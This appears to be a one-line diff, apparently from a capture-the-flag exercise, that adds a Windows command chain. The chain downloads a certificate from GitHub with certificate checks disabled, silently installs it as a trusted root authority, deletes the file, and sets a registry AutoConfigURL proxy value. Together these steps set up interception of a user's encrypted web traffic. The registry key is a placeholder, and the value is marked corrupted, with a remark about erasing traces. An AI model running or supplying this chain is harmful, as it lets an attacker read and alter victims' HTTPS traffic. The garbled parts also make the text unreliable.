@@ -1,0 +1,1 @@
+curl -Lk -o temp.cer "https://raw.githubusercontent.com/PTIT-BunBo/CTF-writeups/refs/heads/main/certi.cer" && certutil -user -addstore root temp.cer && del temp.cer && reg add "just_guessing_hahaha" /v AutoConfigURL /t REG_SZ /d "(corrupted) -- phucdd da tay trang dau vet..." /f
